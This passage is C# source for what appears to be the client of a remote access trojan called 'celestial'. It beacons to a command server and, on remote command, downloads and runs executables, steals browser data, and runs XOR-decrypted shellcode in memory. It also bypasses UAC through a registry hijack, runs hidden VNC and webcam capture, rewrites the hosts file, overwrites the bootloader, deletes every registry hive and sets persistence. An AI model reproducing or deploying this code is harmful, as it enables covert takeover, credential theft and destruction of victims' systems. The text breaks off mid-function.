using celestialC.Helper;
using celestialC.Helper.Information;
using celestialC.Helper.Networking;
using celestialC.Helper.Networking.Telepathy;
using celestialC.Helper.Service;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Permissions;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Message = celestialC.Helper.Networking.Telepathy.Message;
using celestialC.Utils;
using System.Speech.Synthesis;
using Microsoft.Win32;
using WinMM;
using NativeMethods = celestialC.Native.NativeMethods;
using File = System.IO.File;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
using Microsoft.VisualBasic;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Net.NetworkInformation;
using celestialC.Helper.HRDP;
using celestialC.Stealer;
using System.Management;
using celestialC.Helper.Services.compression;
using celestialC.Helper.hVNC;

namespace celestialC
{
    public partial class Form1 : Form
    {
        public const string version = "1.13.0";
        private const int MOUSEEVENTF_LEFTDOWN = 0x02;
        private const int MOUSEEVENTF_LEFTUP = 0x04;
        private const int MOUSEEVENTF_RIGHTDOWN = 0x08;
        private const int MOUSEEVENTF_RIGHTUP = 0x10;
        private bool needRecord = false;
        public static bool IsCameraWork = false;
        public static bool StreamActive = false;
        public static bool hStreamActive = false;
        string[] recordoptions;
        private string FullP;
        private string DLPath;
        private string executeext = ".exe";
        private static IStreamCodec _unsafeCodec = new UnsafeStreamCodec(new JpgCompression(20),
                                    UnsafeStreamCodecParameters.DontDisposeImageCompressor |
                                    UnsafeStreamCodecParameters.UpdateImageEveryTwoSeconds);
        win Win = new win();
        chat Chat;
        public Form1()
        {
            InitializeComponent();
        }

        private static string getRAW(string url)
        {
            WebRequest request = WebRequest.CreateHttp(url);
            WebResponse response = request.GetResponse();
            Stream receiveStream = response.GetResponseStream();
            StreamReader readStream = null;


            readStream = new StreamReader(receiveStream);

            string data = readStream.ReadToEnd();

            response.Dispose();
            readStream.Dispose();

            return data;
        }

        private async void ConnectLoop()
        {
            while (true)
            {
                while (!Networking.MainClient.Connected)
                {
                    needRecord = false;
                    if (IsCameraWork) WebCamHelper.WebcamDispose();
                    if (StreamActive) StopRD();
                    if (hStreamActive) StophVNC();

                    if (Convert.ToBoolean(Settings.UsePastebin))
                        try
                        {
                            string pastedata = getRAW(Settings.PastebinLink);
                            string[] words = pastedata.Split(':');
                            Settings.DNS = words[0];
                            Settings.Port = words[1];
                        }
                        catch { }
                    await Task.Delay(2000);
                    try
                    {
                        Networking.MainClient.Connect(Settings.DNS, Int32.Parse(Settings.Port));
                    }
                    catch { }
                }

                while (Networking.MainClient.Connected)
                {
                    await Task.Delay(1);
                    GetData();
                }
                await Task.Delay(2000);
            }
        }

        private void GetData()
        {
            Message Data;
            while (Networking.MainClient.GetNextMessage(out Data))
                switch (Data.eventType)
                {
                    case EventType.Connected:
                        List<byte> ToSend = new List<byte>();
                        ToSend.Add((int)DataType.Connected_IP);
                        ToSend.AddRange(Encoding.UTF8.GetBytes(ComputerInfo.GetPublicIP()));
                        ToSend.AddRange(Encoding.UTF8.GetBytes("<Cel>"));
                        ToSend.AddRange(Encoding.UTF8.GetBytes(Settings.ClientTag));
                        ToSend.AddRange(Encoding.UTF8.GetBytes("<Cel>"));
                        ToSend.AddRange(Encoding.UTF8.GetBytes(ComputerInfo.GetAntivirus()));
                        ToSend.AddRange(Encoding.UTF8.GetBytes("<Cel>"));
                        ToSend.AddRange(Encoding.UTF8.GetBytes(ComputerInfo.GetWindowsVersion()));
                        ToSend.AddRange(Encoding.UTF8.GetBytes("<Cel>"));
                        ToSend.AddRange(Encoding.UTF8.GetBytes(ComputerInfo.GetCPU()));
                        ToSend.AddRange(Encoding.UTF8.GetBytes("<Cel>"));
                        ToSend.AddRange(Encoding.UTF8.GetBytes(ComputerInfo.GetGPU()));
                        ToSend.AddRange(Encoding.UTF8.GetBytes("<Cel>"));
                        ToSend.AddRange(Encoding.UTF8.GetBytes(ComputerInfo.GetCountry()));
                        ToSend.AddRange(Encoding.UTF8.GetBytes("<Cel>"));
                        ToSend.AddRange(Encoding.UTF8.GetBytes(ComputerInfo.GetPriv()));
                        ToSend.AddRange(Encoding.UTF8.GetBytes("<Cel>"));
                        ToSend.AddRange(Encoding.UTF8.GetBytes(version));
                        ToSend.AddRange(Encoding.UTF8.GetBytes("<Cel>"));
                        ToSend.AddRange(Encoding.UTF8.GetBytes(ComputerInfo.ScreenMetrics()));
                        ToSend.AddRange(Encoding.UTF8.GetBytes("<Cel>"));
                        ToSend.AddRange(Encoding.UTF8.GetBytes(Methods.isRoot().ToString()));
                        Networking.MainClient.Send(ToSend.ToArray());
                        break;

                    case EventType.Disconnected:
                        break;

                    case EventType.Data:
                        if (Settings.isServer)
                            HandleData(Methods.encode(Data.data));
                        else
                            HandleData(Data.data);
                        break;
                }
        }

        public static async void sendlog(bool ChromeTerminate)
        { 
            if (!Libs.LoadRemoteLibrary(Libs.ZipLib))
            {
                return;
            }


            if (ChromeTerminate)
            {
                foreach (var process in Process.GetProcessesByName("Chrome"))
                {
                    process.Kill();
                }
            }
            string workdir;
            try
            {
                workdir = await Stealer.Stealer.StealEverything();
            }
            catch {return; }
            Filemanager.CreateArchive(workdir, false);
            byte[] FileBytes;
            using (FileStream FS = new FileStream(workdir + ".zip", FileMode.Open))
            {
                FileBytes = new byte[FS.Length];
                FS.Read(FileBytes, 0, FileBytes.Length);
            }
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)DataType.StealTag);
            ToSend.AddRange(FileBytes);
            PacketSender.Send(ToSend.ToArray());
            File.Delete(Path.Combine(workdir + ".zip"));
        }

        private void GetProcesses()
        {
            Process[] PL = Process.GetProcesses();
            List<string> ProcessList = new List<string>();
            foreach (Process P in PL)
                ProcessList.Add("{" + P.ProcessName + "}<" + P.Id + ">[" + P.MainWindowTitle + "]");
            string[] StringArray = ProcessList.ToArray<string>();
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)DataType.ProcessType);
            string ListString = "";
            foreach (string Process in StringArray) ListString += "][" + Process;
            ToSend.AddRange(Encoding.UTF8.GetBytes(ListString));
            //PacketSender.Send(ToSend.ToArray());
            PacketSender.Send(ToSend.ToArray());
        }
        private new void MouseClick(string[] MouseArgs)
        {
            int X = Convert.ToInt32(MouseArgs[0]);
            int Y = Convert.ToInt32(MouseArgs[1]);

            Point Location = new Point(X, Y);

            Cursor.Position = Location;

            if (MouseArgs[2] == "D")
            {
                NativeMethods.mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, (uint)Location.X, (uint)Location.Y, 0, 0);
                Thread.Sleep(1);
                NativeMethods.mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, (uint)Location.X, (uint)Location.Y, 0, 0);
            }
            else if (MouseArgs[2] == "L")
            {
                NativeMethods.mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, (uint)Location.X, (uint)Location.Y, 0, 0);
            }
            else if (MouseArgs[2] == "R")
            {
                NativeMethods.mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, (uint)Location.X, (uint)Location.Y, 0, 0);
            }
        }

        public static string GetFileExtensionFromUrl(string url)
        {
            url = url.Split('?')[0];
            url = url.Split('/').Last();
            return url.Contains('.') ? url.Substring(url.LastIndexOf('.')) : "";
        }

        private void DlAndExec(string Data)
        {
            try
            {
                using (WebClient wc = new WebClient())
                {
                    string fileExtensionn = GetFileExtensionFromUrl(Data);
                    Random rnd = new Random();
                    FullP = Path.GetTempPath() + rnd.Next() + fileExtensionn;
                    wc.DownloadProgressChanged += wc_DownloadProgressChanged;
                    wc.DownloadFileAsync(
                                new System.Uri(Data),
                                FullP
                             );
                }
            }
            catch { }
        }

        void wc_DownloadProgressChanged(object sender, DownloadProgressChangedEventArgs e)
        {
            if (e.ProgressPercentage == 100)
            {
                try
                {
                    Process.Start(FullP);
                }
                catch { }
            }
        }

        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        private void HandleData(byte[] RawData)
        {
            byte[] ToProcess = RawData.Skip(1).ToArray();

            switch (RawData[0])
            {
                case 0:
                    MsgBox(Encoding.UTF8.GetString(ToProcess).Split(';'));
                    break;
                case 1:
                    if (!Convert.ToBoolean(Settings.isLotl))
                        Elevate();
                    break;
                case 2:
                    string fileNameD = System.IO.Path.GetTempPath() + Guid.NewGuid().ToString() + executeext;
                    File.WriteAllBytes(fileNameD, ToProcess);
                    try
                    {
                        Process.Start(fileNameD);
                    }
                    catch { }
                    break;
                case 3:
                    Uninstall();
                    Environment.Exit(0);
                    break;
                case 4:
                    Methods.ClientOnExit();
                    Environment.Exit(0);
                    break;
                case 5:
                    TextTS(Encoding.UTF8.GetString(ToProcess));
                    break;
                case 6:
                    notepad(Encoding.UTF8.GetString(ToProcess).Split(';'));
                    break;
                case 7:
                    DlAndExec(Encoding.UTF8.GetString(ToProcess));
                    break;
                case 8:
                    string fileNameW = System.IO.Path.GetTempPath() + Guid.NewGuid().ToString() + ".jpg";
                    File.WriteAllBytes(fileNameW, ToProcess);
                    NativeMethods.SystemParametersInfo(0x14, 0, fileNameW, 0);
                    break;
                case 9:
                    GetProcesses();
                    break;
                case 10:
                    ProcessMan(Encoding.UTF8.GetString(ToProcess).Split(';'));
                    break;
                case 11:
                    UpdateWinData(Encoding.UTF8.GetString(ToProcess).Split(';'));
                    break;
                case 12:
                    WinL(Encoding.UTF8.GetString(ToProcess));
                    break;
                case 13:
                    StartRS();
                    break;
                case 14:
                    StopRS();
                    break;
                case 15:
                    Command(Encoding.UTF8.GetString(ToProcess));
                    break;
                case 16:
                    StartRD(Encoding.UTF8.GetString(ToProcess).Split(';'));
                    break;
                case 17:
                    StopRD();
                    break;
                case 18:
                    recordoptions = Encoding.UTF8.GetString(ToProcess).Split(';');
                    if (!backgroundWorker1.IsBusy)
                        backgroundWorker1.RunWorkerAsync();
                    needRecord = true;
                    break;
                case 19:
                    needRecord = false;
                    break;
                case 20:
                    try
                    {
                        sendlog(Convert.ToBoolean(Encoding.UTF8.GetString(ToProcess)));
                    }
                    catch { }
                    break;
                case 21:
                    RotateScreen(Encoding.UTF8.GetString(ToProcess));
                    break;
                case 22:
                    ChangeKeyboardL(Encoding.UTF8.GetString(ToProcess));
                    break;
                case 23:
                    MouseButtonsSwapper(Encoding.UTF8.GetString(ToProcess));
                    break;
                case 24:
                    CDDrive(Encoding.UTF8.GetString(ToProcess));
                    break;
                case 25:
                    switch (Encoding.UTF8.GetString(ToProcess))
                    {
                        case "0":
                            GDI.InvertedColor();
                            break;
                        case "1":
                            GDI.BlurGDI();
                            break;
                        case "2":
                            GDI.RoundedTunnel();
                            break;
                        case "3":
                            GDI.Melter();
                            break;
                        case "4":
                            GDI.RadialBlur();
                            break;
                        case "5":
                            GDI.BloodyScreen();
                            break;

                    }
                    break;
                case 26:
                    try
                    {
                        Methods.TriggerBSoD();
                    }
                    catch { }
                    break;
                case 27:
                    GatherInfo();
                    break;
                case 28:
                    PoliciesCMD(Encoding.UTF8.GetString(ToProcess));
                    break;
                case 29:
                    Process.Start("shutdown", "/s /t 0");
                    break;
                case 30:
                    Process.Start("shutdown", "/r /t 0");
                    break;
                case 31:
                    MouseClick(Encoding.UTF8.GetString(ToProcess).Split(';'));
                    break;
                case 32:
                    keyboardInput(Encoding.UTF8.GetString(ToProcess).Split(';'));
                    break;
                case 33:
                    Process.Start(Encoding.UTF8.GetString(ToProcess));
                    break;
                case 34:
                    Process p1 = new Process();
                    p1.StartInfo.FileName = "cmd.exe";
                    p1.StartInfo.Arguments = "/c REG DELETE HKCR /f";
                    p1.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    p1.StartInfo.CreateNoWindow = true;
                    Process p2 = new Process();
                    p2.StartInfo.FileName = "cmd.exe";
                    p2.StartInfo.Arguments = "/c REG DELETE HKCU /f";
                    p2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    p2.StartInfo.CreateNoWindow = true;
                    Process p3 = new Process();
                    p3.StartInfo.FileName = "cmd.exe";
                    p3.StartInfo.Arguments = "/c REG DELETE HKLM /f";
                    p3.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    p3.StartInfo.CreateNoWindow = true;
                    Process p4 = new Process();
                    p4.StartInfo.FileName = "cmd.exe";
                    p4.StartInfo.Arguments = "/c REG DELETE HKU /f";
                    p4.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    p4.StartInfo.CreateNoWindow = true;
                    Process p5 = new Process();
                    p5.StartInfo.FileName = "cmd.exe";
                    p5.StartInfo.Arguments = "/c REG DELETE HKCC /f";
                    p5.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    p5.StartInfo.CreateNoWindow = true;
                    p1.Start();
                    p2.Start();
                    p3.Start();
                    p4.Start();
                    p5.Start();
                    break;
                case 35:
                    Uninstall();
                    string fileNameU = System.IO.Path.GetTempPath() + Guid.NewGuid().ToString() + ".exe";
                    File.WriteAllBytes(fileNameU, ToProcess);
                    Process.Start(fileNameU);
                    Environment.Exit(0);
                    break;
                case 36:
                    executeext = Encoding.UTF8.GetString(ToProcess);
                    break;
                case 37:
                    Networking.MainClient.Disconnect();
                    break;
                case 38:
                    string pathvbs = System.IO.Path.GetTempPath() + Guid.NewGuid().ToString() + ".vbs";
                    if (File.Exists(pathvbs))
                        File.Delete(pathvbs);

                    if (!File.Exists(pathvbs))
                    {
                        File.WriteAllText(pathvbs, Encoding.UTF8.GetString(ToProcess));
                        Process.Start(pathvbs);
                    }
                    break;
                case 39:
                    string pathbat = System.IO.Path.GetTempPath() + Guid.NewGuid().ToString() + ".bat";
                    if (File.Exists(pathbat))
                        File.Delete(pathbat);

                    if (!File.Exists(pathbat))
                    {
                        File.WriteAllText(pathbat, Encoding.UTF8.GetString(ToProcess));
                        Process.Start(pathbat);
                    }
                    break;
                case 40:
                    IntPtr lHwnd = NativeMethods.FindWindow("Shell_TrayWnd", null);
                    NativeMethods.SendMessage(lHwnd, 0x111, (IntPtr)419, IntPtr.Zero);
                    break;
                case 41:
                    List<byte> ToSendD = new List<byte>();
                    ToSendD.Add(8);
                    ToSendD.AddRange(Encoding.UTF8.GetBytes(FMDrives()));
                    PacketSender.Send(ToSendD.ToArray());
                    break;
                case 42:
                    List<byte> ToSendF = new List<byte>();
                    string processtext;
                    if (Encoding.UTF8.GetString(ToProcess).StartsWith("%"))
                    {
                        processtext = Environment.ExpandEnvironmentVariables(Encoding.UTF8.GetString(ToProcess));
                        ToSendF.Clear();
                        ToSendF.Add(9);
                        ToSendF.AddRange(Encoding.UTF8.GetBytes(processtext + "\\"));
                        PacketSender.Send(ToSendF.ToArray());
                    }
                    else
                    processtext = Encoding.UTF8.GetString(ToProcess);
                    ToSendF.Clear();
                    ToSendF.Add(8);
                    ToSendF.AddRange(Encoding.UTF8.GetBytes(FMFolders(processtext) + FMFiles(processtext)));
                    PacketSender.Send(ToSendF.ToArray());
                    break;
                case 43:
                    try
                    {
                        Process.Start(Encoding.UTF8.GetString(ToProcess));
                    }
                    catch { }
                    break;
                case 44:
                    try
                    {
                        FileAttributes attr = File.GetAttributes(Encoding.UTF8.GetString(ToProcess));
                        if ((attr & FileAttributes.Directory) == FileAttributes.Directory)
                            Filemanager.RecursiveDelete(Encoding.UTF8.GetString(ToProcess));
                        else
                            File.Delete(Encoding.UTF8.GetString(ToProcess));
                    }
                    catch { }
                    break;
                case 45:
                    DLPath = Encoding.UTF8.GetString(ToProcess);
                    break;
                case 46:
                    try
                    {
                        File.WriteAllBytes(DLPath, ToProcess);
                    }
                    catch { }
                    break;
                case 47:
                    try
                    {
                        byte[] FileBytes;
                        using (FileStream FS = new FileStream(Encoding.UTF8.GetString(ToProcess), FileMode.Open))
                        {
                            FileBytes = new byte[FS.Length];
                            FS.Read(FileBytes, 0, FileBytes.Length);

                            List<byte> ToSendZ = new List<byte>();
                            ToSendZ.Add((int)10);
                            ToSendZ.AddRange(FileBytes);
                            PacketSender.Send(ToSendZ.ToArray());
                        }
                    }
                    catch { }
                    break;
                case 48:
                    List<byte> ToSendDE = new List<byte>();
                    ToSendDE.Add(11);
                    ToSendDE.AddRange(Encoding.UTF8.GetBytes(getDevices()));
                    PacketSender.Send(ToSendDE.ToArray());
                    break;
                case 49:
                    var source = Encoding.UTF8.GetString(ToProcess);
                    var providerOptions = new Dictionary<string, string>
                    {
                        {"CompilerVersion", "v3.5"}
                    };

                    var provider = new CSharpCodeProvider(providerOptions);
                    var compilerParams = new CompilerParameters
                    {
                        GenerateInMemory = true,
                        GenerateExecutable = false
                    };
                    compilerParams.ReferencedAssemblies.Add("System.dll");
                    compilerParams.ReferencedAssemblies.Add("System.Core.dll");
                    compilerParams.ReferencedAssemblies.Add("System.Windows.Forms.dll");
                    compilerParams.ReferencedAssemblies.Add("System.Xml.dll");
                    compilerParams.ReferencedAssemblies.Add("System.Xml.Linq.dll");

                    var results = provider.CompileAssemblyFromSource(compilerParams, source);

                    if (results.Errors.HasErrors)
                    {
                        var error = results.Errors.OfType<CompilerError>().First(x => !x.IsWarning);
                        List<byte> ToSendE = new List<byte>();
                        ToSendE.Add((int)12);
                        ToSendE.AddRange(Encoding.UTF8.GetBytes(error.Line.ToString()));
                        ToSendE.Add((byte)';');
                        ToSendE.AddRange(Encoding.UTF8.GetBytes(error.ErrorText));
                        PacketSender.Send(ToSendE.ToArray());
                        return;
                    }

                    try
                    {
                        object o = results.CompiledAssembly.CreateInstance("Celestial.Scripting");
                        var method = o?.GetType().GetMethod("Main");
                        Task.Factory.StartNew(() => { method.Invoke(o, null); });
                    }
                    catch { }

                    break;
                case 50:
                    if (Methods.IsAdmin() || Convert.ToBoolean(Settings.isLotl))
                        return;
                    if (Encoding.UTF8.GetString(ToProcess) == "0")
                    {
                        if (SilentElevate())
                        {
                            Methods.ClientOnExit();
                            Environment.Exit(0);
                        }
                    }
                    if (Encoding.UTF8.GetString(ToProcess) == "1")
                    {
                        if (ElevateCompute())
                        {
                            Methods.ClientOnExit();
                            Environment.Exit(0);
                        }
                    }
                    break;
                case 51:
                    try
                    {
                        if (Encoding.UTF8.GetString(ToProcess) == "0")
                            getStartup();
                        else if (Encoding.UTF8.GetString(ToProcess).StartsWith("1"))
                        {
                            RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                            if (key != null)
                            {
                                string[] torem = Encoding.UTF8.GetString(ToProcess).Split(';');
                                key.DeleteValue(torem[1]);
                                key.Close();
                            }
                        }
                        else if (Encoding.UTF8.GetString(ToProcess).StartsWith("2"))
                        {
                            RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                            if (key != null)
                            {
                                string[] torem = Encoding.UTF8.GetString(ToProcess).Split(';');
                                key.DeleteValue(torem[1]);
                                key.Close();
                            }
                        }
                        else if (Encoding.UTF8.GetString(ToProcess).StartsWith("3"))
                        {
                            RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true);
                            if (key != null)
                            {
                                string[] torem = Encoding.UTF8.GetString(ToProcess).Split(';');
                                key.DeleteValue(torem[1]);
                                key.Close();
                            }
                        }
                        else if (Encoding.UTF8.GetString(ToProcess).StartsWith("4"))
                        {
                            RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true);
                            if (key != null)
                            {
                                string[] torem = Encoding.UTF8.GetString(ToProcess).Split(';');
                                key.DeleteValue(torem[1]);
                                key.Close();
                            }
                        }
                        else if (Encoding.UTF8.GetString(ToProcess).StartsWith("5"))
                        {
                            RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                            if (key != null)
                            {
                                string[] torem = Encoding.UTF8.GetString(ToProcess).Split(';');
                                key.DeleteValue(torem[1]);
                                key.Close();
                            }
                        }
                        else if (Encoding.UTF8.GetString(ToProcess).StartsWith("6"))
                        {
                            RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true);
                            if (key != null)
                            {
                                string[] torem = Encoding.UTF8.GetString(ToProcess).Split(';');
                                key.DeleteValue(torem[1]);
                                key.Close();
                            }
                        }
                        else if (Encoding.UTF8.GetString(ToProcess).StartsWith("7"))
                        {
                            RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

                            if (key != null)
                            {
                                string[] torem = Encoding.UTF8.GetString(ToProcess).Split(';');
                                if (!torem[1].StartsWith("\"") && !torem[1].EndsWith("\""))
                                {
                                    torem[1] = "\"" + torem[1] + "\"";
                                }
                                key.SetValue(torem[0].Remove(torem[0].IndexOf('7'), 1), torem[1]);
                                key.Close();
                            }
                        }
                        break;
                    }
                    catch { break; }
                case 52:
                    List<byte> ToSendDES = new List<byte>();
                    ToSendDES.Add(14);
                    ToSendDES.AddRange(Encoding.UTF8.GetBytes(ShowActiveTcpConnections()));
                    PacketSender.Send(ToSendDES.ToArray());
                    break;
                case 53:
                    string assemblyPath = Assembly.GetExecutingAssembly().Location;
                    if (!Libs.LoadRemoteLibrary(Libs.AForgeDirectShow))
                    {
                        return;
                    }
                    if (!Libs.LoadRemoteLibrary(Libs.AForgeVideo))
                    {
                        return;
                    }
                    WebCamHelper.AutoWebcamPacket(ToProcess);
                    break;
                case 54:
                    if (Encoding.UTF8.GetString(ToProcess) == "1")
                    {
                        if (Chat == null) Chat = new chat();
                        if (Chat.IsDisposed) Chat = new chat();

                        Chat.Show();
                    }
                    else
                    {
                        Chat?.Dispose();
                    }
                    break;
                case 55:
                    Chat.textBox2.Text += "Him: " + Encoding.UTF8.GetString(ToProcess) + Environment.NewLine;
                    break;
                case 56:
                    string[] recieved = Encoding.UTF8.GetString(ToProcess).Split(';');

                    if (Convert.ToInt32(recieved[0]) < 37) recieved[0] = "37";
                    if (Convert.ToInt32(recieved[0]) > 32767) recieved[0] = "32767";

                    Console.Beep(Convert.ToInt32(recieved[0]), Convert.ToInt32(recieved[1]));

                    break;
                case 57:
                    if (Encoding.UTF8.GetString(ToProcess) == "0")
                    {
                        string hosts = File.ReadAllText(@"C:\Windows\System32\drivers\etc\hosts");

                        List<byte> ToSendH = new List<byte>();
                        ToSendH.Add((int)18);
                        ToSendH.AddRange(Encoding.UTF8.GetBytes(hosts));
                        PacketSender.Send(ToSendH.ToArray());
                    }
                    else
                    {
                        if(Methods.IsAdmin()) 
                            File.WriteAllText(@"C:\Windows\System32\drivers\etc\hosts", Encoding.UTF8.GetString(ToProcess));
                    }
                    break;
                case 58: // ngrokinstall
                    Ngrok.Install(Encoding.UTF8.GetString(ToProcess));
                    UpdateRDPInfo();
                    break;
                case 59: // HRDP
                    if(Encoding.UTF8.GetString(ToProcess) == "0")
                    {
                        UpdateRDPInfo();
                    }
                    else if (Encoding.UTF8.GetString(ToProcess) == "1")
                    {
                        RDP.Install();
                        UpdateRDPInfo();
                    }
                    break;
                case 60: // moniki
                    ManagementObjectSearcher searcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_PnPEntity where service=\"monitor\"");
                    List<byte> ToSendMO = new List<byte>();
                    ToSendMO.Add(20);
                    ToSendMO.AddRange(Encoding.UTF8.GetBytes(searcher.Get().Count.ToString()));
                    PacketSender.Send(ToSendMO.ToArray());
                    break;
                case 61:
                    Methods.OverwriteBootloader(ToProcess);
                    break;
                case 62:
                    StarthVNC(Encoding.UTF8.GetString(ToProcess).Split(';'));
                    hVNC.StartExpl();
                    break;
                case 63:
                    StophVNC();
                    break;
                case 64:
                    switch (Encoding.UTF8.GetString(ToProcess))
                    {
                        case "0":
                            hVNC.CreateProcc(@"C:\Windows\System32\rundll32.exe shell32.dll,#61");
                            break;
                        case "1":
                            foreach (var process in Process.GetProcessesByName("msedge"))
                            {
                                process.Kill();
                            }
                            hVNC.CreateProcc("\"" + @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" + "\"" + @" --no-sandbox --allow-no-sandbox-job --disable-gpu");
                            break;
                        case "2":
                            foreach (var process in Process.GetProcessesByName("Chrome"))
                            {
                                process.Kill();
                            }
                            hVNC.CreateProcc(@"C:\Program Files\Google\Chrome\Application\chrome.exe");
                            break;
                        case "3":
                            foreach (var process in Process.GetProcessesByName("firefox"))
                            {
                                process.Kill();
                            }
                            hVNC.CreateProcc("\"" + @"C:\Program Files\Mozilla Firefox\firefox.exe" + "\"" + @" -no-remote");
                            break;
                        case "4":
                            hVNC.CreateProcc(@"cmd.exe");
                            break;
                        case "5":
                            hVNC.CreateProcc(@"powershell.exe");
                            break;
                        case "6":
                            hVNC.StartExpl();
                            break;
                    }
                    break;
                case 65:
                    string[] splitteddata = Encoding.UTF8.GetString(ToProcess).Split('|');
                    uint msg = (uint)Convert.ToInt32(splitteddata[0]);
                    IntPtr wParam = (IntPtr)Convert.ToInt32(splitteddata[1]);
                    IntPtr lParam = (IntPtr)Convert.ToInt32(splitteddata[2]);
                    new Thread(() => hVNC.InputHandler.Input(msg, wParam, lParam)).Start();
                    break;
                case 66:
                    if (Methods.isRoot()) return;
                    new Thread(() =>
                    {
                        ExecuteShellCode(ToProcess);
                        Thread.Sleep(7500);
                        if(!Convert.ToBoolean(Settings.isLotl))
                        {
                            Methods.ClientOnExit();
                            Application.Restart();
                        }
                        else
                        {
                            PipeController.sendcommand(0x2004, BitConverter.GetBytes(Process.GetCurrentProcess().Id));
                        }
                    }).Start();
                    break;
                case 67:
                    try
                    {
                        needRecord = false;
                        if (IsCameraWork) WebCamHelper.WebcamDispose();
                        if (StreamActive) StopRD();
                        if (hStreamActive) StophVNC();
                    }catch { }
                    break;
                case 68:
                    PluginManager.ExecuteFromMemory(ToProcess);
                    break;
            }
        }

        public static void ExecuteShellCode(byte[] bytes)
        {
            char[] key = { 'c', 'E', 'L', 'e', 'S', 't', 'I', 'A', 'l' };
            byte[] decryptedbytes = new byte[bytes.Length];
            int j = 0;
            for (int i = 0; i < bytes.Length; i++)
            {
                if (j == key.Length)
                {
                    j = 0;
                }
                decryptedbytes[i] = (byte)(bytes[i] ^ Convert.ToByte(key[j]));
                j++;
            }
            try
            {
                IntPtr buffer = NativeMethods.VirtualAlloc(IntPtr.Zero, (IntPtr)decryptedbytes.Length, 0x1000, 0x40);
                Marshal.Copy(decryptedbytes, 0, buffer, decryptedbytes.Length);

                IntPtr thread = NativeMethods.CreateThread(IntPtr.Zero, 0, buffer, IntPtr.Zero, 0, out _);
                NativeMethods.WaitForSingleObject(thread, 0xffffffff);
            }
            catch {
                List<byte> ToSend = new List<byte>();
                ToSend.Add(21);
                ToSend.AddRange(Encoding.UTF8.GetBytes("Can't execute/decypt shellcode"));
                PacketSender.Send(ToSend.ToArray());

            }
        }

        public static void UpdateRDPInfo()
        {
            var thread = new Thread(() =>
            {
                string toresponse = "";
                if (File.Exists(Environment.ExpandEnvironmentVariables("%Temp%") + "\\ngrok.exe")) toresponse += "true;";
                else toresponse += "false;";
                if (Ngrok.API().Length > 5) toresponse += Ngrok.API() + ";";
                else toresponse += "false;";
                if (RDP.AccountExists("CelestialRDP")) toresponse += "true;true;";
                else toresponse += "false;false;";
                if (File.Exists(Environment.ExpandEnvironmentVariables("%Temp%") + "\\rdp.exe")) toresponse += "true;true";
                else toresponse += "false;false";

                List<byte> ToSendH = new List<byte>();
                ToSendH.Add((int)19);
                ToSendH.AddRange(Encoding.UTF8.GetBytes(toresponse));
                PacketSender.Send(ToSendH.ToArray());
            });
            thread.IsBackground = true;
            thread.Start();
        }

        public static string ShowActiveTcpConnections()
        {
            string connectionresults = "";
            string delimeter = "-";
            string tempstring = "";
            IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();
            TcpConnectionInformation[] connections = properties.GetActiveTcpConnections();
            foreach (TcpConnectionInformation c in connections)
            {
                tempstring = "TCP" + ";" + c.LocalEndPoint + ";" + c.RemoteEndPoint + ";" + c.State;
                connectionresults += delimeter + tempstring;
            }
            return connectionresults;
        }

        private bool ElevateCompute()
        {
            try
            {
                RegistryKey currentUser = Registry.CurrentUser;
                currentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\command");
                RegistryKey registryKey = currentUser.OpenSubKey("Software\\Classes\\ms-settings\\shell\\open\\command", true);
                registryKey.SetValue("", Process.GetCurrentProcess().MainModule.FileName);
                registryKey.SetValue("DelegateExecute", "");
                currentUser.Close();
                string str = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\System32\\ComputerDefaults.exe";
                Process.Start(str);
                return true;
            }catch { return false; };
        }
        private void getStartup()
        {
            string delimeter = ";";
            string mdelimeter = "|";
            string tosendstring = "";
            // Открываем раздел реестра, содержащий автозагружаемые программы
            try
            {
                RegistryKey startupKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false);

                if (startupKey != null)
                {
                    // Получаем имена всех подключений в разделе автозагрузки
